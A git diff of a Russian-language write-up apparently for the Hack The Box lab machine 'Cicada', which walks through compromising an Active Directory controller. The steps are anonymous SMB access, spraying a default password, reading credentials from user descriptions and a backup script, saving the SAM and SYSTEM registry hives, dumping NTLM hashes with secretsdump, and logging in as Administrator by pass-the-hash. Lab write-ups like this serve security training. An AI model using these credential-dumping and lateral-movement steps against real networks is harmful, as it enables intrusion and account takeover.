@@ -3,7 +3,7 @@
 ---
 
 По традиции проводим сканирование портов через **nmap**, параметр `-Pn` используем: в этой машине порты 443 и 80 закрыты
-```vbnet
+```PowerShell
 # Nmap 7.60 scan initiated Wed Dec 18 05:30:16 2024 as: nmap -Pn -sS -sC -sV -p- -T5 --max-rate 10000 -oN cicada.txt cicada.htb
 Nmap scan report for cicada.htb (10.10.11.35)
 Host is up (0.065s latency).
@@ -120,9 +120,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 Порт **135** (**RPC**) - это протокол, который позволяет приложениям на одном компьютере вызывать функции или процедуры на другом компьютере в сети. Это основной способ взаимодействия программ в распределенных системах
 
-Порт **88/tcp** используется для протокола **Kerberos** — системы аутентификации, которая широко используется в сетях для безопасной идентификации пользователей. Этот протокол играет ключевую роль в аутентификации как в **LDAP**, **RPC**, так и в **SMB**. В частности, в средах, таких как **Active Directory**, **Kerberos** обеспечивает безопасный обмен учетными данными между клиентами и серверами.
+Порт **88/tcp** используется для протокола **Kerberos** — системы аутентификации, которая широко используется в сетях для безопасной идентификации пользователей. Этот протокол играет ключевую роль в аутентификации как в **LDAP**, **RPC**, так и в **SMB**. В частности, в средах, таких как **Active Directory**, **Kerberos** обеспечивает безопасный обмен учетными данными между клиентами и серверами
 
-Пока что, этой информации нам достаточно, чтоб начать поиск уязвимостей, начинать мы будем с **SMB** протокола. В данном документации, я буду использовать утилиту **smbclient** для роботы с ним, для начала, давайте узнаем какие существуют шары в сети
+Пока что, этой информации нам достаточно, чтоб начать поиск уязвимостей, начинать мы будем с **SMB** протокола. Я буду использовать утилиту **smbclient** для роботы с ним, для начала, давайте узнаем какие существуют шары в сети
 ```
 (netexec-py3.13) Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ smbclient -L //cicada.htb -N
 Can't load /etc/samba/smb.conf - run testparm to debug it
@@ -139,10 +139,10 @@ Can't load /etc/samba/smb.conf - run testparm to debug it
 SMB1 disabled -- no workgroup available
 ```
 
-Таким образом, у нас есть список шаров **SMB** сети, что является важной утечкой информации. Чтобы предотвратить такую утечку, можно ограничить отображение списка общих ресурсов в конфигурации **Samba**, добавив параметр ```hide unreadable = yes``` в файл `/etc/samba/smb.conf`.
+Таким образом, у нас есть список шаров **SMB** сети, что является важной утечкой информации. Чтобы предотвратить такую утечку, можно ограничить отображение списка общих ресурсов в конфигурации **Samba**, добавив параметр ```hide unreadable = yes``` в файл `/etc/samba/smb.conf`
 
 Если файл `/etc/samba/smb.conf` неправильно настроен, это может привести к опасным уязвимостям, одной из которых является анонимный доступ к общим ресурсам. Например, если мы попытаемся войти в каждый из шаров без аутентификации, используя параметр `-N`, мы можем обнаружить, что шар **HR** доступен без аутентификации:
-```vbnet
+```
 smbclient //cicada.htb/HR -N
 Can't load /etc/samba/smb.conf - run testparm to debug it
 Try "help" to get a list of possible commands.
@@ -150,7 +150,7 @@ smb: \>
 ```
 
 Мы видим что у нас есть какой-то файл внутри шара, к которому мы имеем доступ, 
-```vbnet
+```
 smb: \> ls
   .                                   D        0  Thu Mar 14 14:29:09 2024
   ..                                  D        0  Thu Mar 14 14:21:29 2024
@@ -160,7 +160,7 @@ smb: \> ls
 ```
 
 Стоит учитывать, что на данный момент мы находимся в **Windows**, поэтому, чтоб скопировать файл в нашу директорию на нашу ОС, нам нужно выполнить следуйщую **Power shell** команду
-```vbnet
+```
 smb: \> mget *
 ```
 
@@ -194,15 +194,11 @@ Cicada Corp
 
 На основе этого письма, мы можем узнать, что в учетных записях **SMB** сети, у всех по умолчанию стоит пароль `Cicada$M6Corpb*****`, если логично подумать, должен быть какой-то сотрудник, который забыл изменить пароль, если у нас получиться узнать список учётных записей **SMB** сети, возможно, мы сможем подключиться к какой-то из них, для этого мы будем использовать утилиту **NetExec**
 ```git clone https://github.com/Pennyw0rth/NetExec```
-
 ```sudo pacman -S poetry``` либо ```sudo apt install poetry```
-
 ```poetry install```
-
 ```cd nxc```
-
 ```poetry run python netexec.py smb cicada.htb -u abzee -p "" --rid-brute > cicada.txt```
-```vbnet
+```
 SMB                      10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
 SMB                      10.10.11.35     445    CICADA-DC        [+] cicada.htb\abzee: (Guest)
 SMB                      10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
@@ -238,7 +234,7 @@ SMB                      10.10.11.35     445    CICADA-DC        1109: CICADA\De
 SMB                      10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
 ```
 
-Получив список учетных записей, нам нужно каким-то образом узнать, есть ли тут какая-то учетная запись, на которой не был изменен пароль и на которой до сих пор стоит пароль Cicada$M6Corpb*****, можно конечно в ручную делать запрос с этим паролем на каждую учетную запись, но это не профессионально, нужно уметь автоматизировать операции, поэтому я написал скрипт на **python** с использованием **re** для парсинга только имени учетных записей, **subprocess** для выполнения подключения к учетной записи через **SMB**, и немного **os** просто чтоб перейти в директорию с **NetExec**, который будет проводить подключение к учетным записям
+Получив список учетных записей, нам нужно каким-то образом узнать, есть ли тут какая-то учетная запись, на которой не был изменен пароль и на которой до сих пор стоит пароль `Cicada$M6Corpb*****`, можно конечно в ручную делать запросы с этим паролем на каждую учетную запись, но это не профессионально, нужно уметь автоматизировать операции, поэтому я написал скрипт на **python** с использованием **re** для парсинга только имени учетных записей, **subprocess** для выполнения подключения к учетной записи через **SMB**, и немного **os** просто чтоб перейти в директорию к инструменту **NetExec**, который будет проводить подключение к учетным записям
 ```python
 import re
 import subprocess
@@ -284,8 +280,8 @@ account login to michael.wrightson account [ * ]
 successful login to michael.wrightson account [ + ]
 ```
 
-Давайте попробуем в неё войти и посмотреть к каким шарам, у нас есть доступ
-```vbnet
+Давайте попробуем в неё войти и посмотреть к каким шарам у нас есть доступ
+```
 Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ poetry run python netexec.py smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*****' --shares
 SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
 SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*****
@@ -319,7 +315,7 @@ do_connect: Connection to CICADA-DC.cicada.htb failed (Error NT_STATUS_UNSUCCESS
 Но мы можем работать через эту учетную запись не только в **SMB**, давайте попробуем войти через неё в **RPC** и **LDAP**
 
 **RPC**
-```vbnet
+```
 Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ rpcclient -U michael.wrightson cicada.htb
 Can't load /etc/samba/smb.conf - run testparm to debug it
 Password for [WORKGROUP\michael.wrightson]:
@@ -327,7 +323,7 @@ rpcclient $>
 ```
 
 Полазив там, посмотрев права и привилегии, посмотрев информацию о пользователях, и изучив группы, я из всего перечисленого, увидел только одну очень интересуную вещь в `Description` пользователя `david.orelious`
-```vbnet
+```
 rpcclient $> queryuser 0x454
         User Name   :   david.orelious
         Full Name   :
@@ -347,10 +343,10 @@ rpcclient $> queryuser 0x454
 
 Кстати, мы можем тоже самое увидеть в `Description`, в **LDAP**
 
-```vbnet
+```
 Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ ldapsearch -H ldap://cicada.htb -D 'michael.wrightson@cicada.htb' -w 'Cicada$M6Corpb*****' -b 'dc=cicada,dc=htb'
 ```
-```vbnet
+```
 # David Orelious, Users, cicada.htb
 dn: CN=David Orelious,CN=Users,DC=cicada,DC=htb
 objectClass: top
@@ -371,7 +367,7 @@ whenChanged: 20250108084925.0Z
 ```
 
 Теперь у нас есть доступ к двум учетным записям, давайте посмотри какие привелегии имеет учетная запись `david.orelious`
-```vbnet
+```
 Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ poetry run python netexec.py smb cicada.htb -u david.orelious -p 'aRt$L*****' --shares
 SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
 SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$L*****
@@ -388,7 +384,7 @@ SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ        
 ```
 
 Как мы видим, мы имеем досиуп к шару **DEV**, к которому мы раньше не имели доступ с учетной записи `michael.wrightson`, давайте смотреть что там
-```vbnet
+```
 Hexada@hexada ~/app/cicada.htb$ smbclient //cicada.htb/DEV -U david.orelious                                                                                                               
 Can't load /etc/samba/smb.conf - run testparm to debug it
 Password for [WORKGROUP\david.orelious]:
@@ -403,8 +399,7 @@ smb: \> mget *
 Get file Backup_script.ps1? y
 getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (1.5 KiloBytes/sec) (average 1.5 KiloBytes/sec)
 ```
-
-```vbnet
+```
 Hexada@hexada ~/app/cicada.htb$ cat Backup_script.ps1                                                                                                                                      
 
 $sourceDirectory = "C:\smb"
@@ -429,7 +424,7 @@ Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath
 **WinRM** — это сервис, предоставляющий возможности удаленного администрирования через **HTTP** и **HTTPS**. Он является частью **Windows Management Framework** и ориентирован для выполнения команд на удаленной машине.
 
 Давайте попробуем войти в **WinRM** через `emily.oscars`
-```vbnet
+```
 Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#*****'
                                         
 Evil-WinRM shell v3.7
@@ -447,12 +442,10 @@ Info: Establishing connection to remote endpoint
 ```
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA> cd ..
 ```
-
 ```
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA> cd Desktop
 ```
-
-```vbnet
+```
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> ls
 
 
@@ -510,7 +503,119 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 **SAM** хранит хеши паролей, а **SYSTEM** хранит ключи для расшифровки этих хешей.
 Для того чтобы извлечь хеш пароля и успешно его расшифровать, вам нужно иметь доступ и к **SAM**, и к **SYSTEM**, поскольку сам хеш пароля в **SAM** зашифрован, и расшифровать его можно только с помощью информации из **SYSTEM**.
 
+Создаем директорию, в которой мы будем хранить резервные копии, и которые мы потом импортации на основной хост
+```
+*Evil-WinRM* PS C:\> mkdir Temp
+
+    Directory: C:\
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         1/12/2025   3:28 PM                Temp
+```
+
+Создаем резервные копии.
+`hklm\system` - это сокращение для **HKEY_LOCAL_MACHINE**, одного из основных разделов реестра **Windows**. Настоящее место нахождение этих файлов в `C:\Windows\System32\config`
+```
+*Evil-WinRM* PS C:\> reg save hklm\sam c:\Temp\sam.reg
+The operation completed successfully.
+```
+```
+*Evil-WinRM* PS C:\> reg save hklm\system c:\Temp\system.reg
+The operation completed successfully.
+```
+
+Все прошло успешно, теперь, давайте установим их на наш хост
+```
+*Evil-WinRM* PS C:\Temp> ls
+
+    Directory: C:\Temp
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         1/12/2025   3:28 PM          49152 sam.reg
+-a----         1/12/2025   3:31 PM       18518016 system.reg
+```
+```
+*Evil-WinRM* PS C:\Temp> download sam
+                                        
+Info: Downloading C:\Temp\sam to sam
+                                        
+Info: Download successful!
+```
+```
+*Evil-WinRM* PS C:\Temp> download system
+                                        
+Info: Downloading C:\Temp\system to system
+                                        
+Info: Download successful!
+```
+
+Теперь, имея файлы **SAM.reg** и **SYSTEM.reg**, нам нужно извлечь хэши **NTLM** из учетных записей системы
+
+**NTLM (New Technology LAN Manager)** — это семейство протоколов аутентификации, разработанных **Microsoft**, которые используются для обеспечения безопасности в **Windows-системах**.
+
+Для извлечения **NTLM** хэшей, мы будем использовать **impacket**
+```
+Hexada@hexada ~/app/cicada.htb$ ls                                                                                                                                                         
+Backup_script.ps1  cicada.txt  HR.txt  NetExecScript.py  SAM.reg  SYSTEM.reg
+```
+```
+Hexada@hexada ~/app/cicada.htb$ secretsdump.py -sam SAM.reg -system SYSTEM.reg LOCAL > NTLM.txt
+```
+```
+Hexada@hexada ~/app/cicada.htb$ cat NTLM.txt                                                                                                                                               
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581*****:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59*****:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59*****:::
+[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
+[*] Cleaning up...
+```
+
+Прекрасно, мы получили пароль от учетной записи `Administrator`
+```
+Hexada@hexada ~/app/cicada.htb$ evil-winrm -i cicada.htb -u administrator -H 2b87e7c93a3e8a0ea4a581*****                                                                      
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> 
+```
+
+Наконец-то, мы можем достать нас заслуженный **Roor Flag** 
+```
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+```
+
+```
+*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
+```
+```
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
 
 
+    Directory: C:\Users\Administrator\Desktop
 
 
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         3/14/2024   6:36 AM             32 .root.txt.txt
+-a--s-         3/14/2024   3:45 AM            282 desktop.ini
+-ar---         1/11/2025   1:11 AM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> more root.txt
+f1c5738d010b6523475f061d9ffc7607
+```
+
+Поздравляю с прохождением машины
+---
+Использываемые инструменты: **nmap**, **netexec**, **smbclient**, **rpcclient**, **ldapsearch**, **evil-winrm**, **secretsdump**
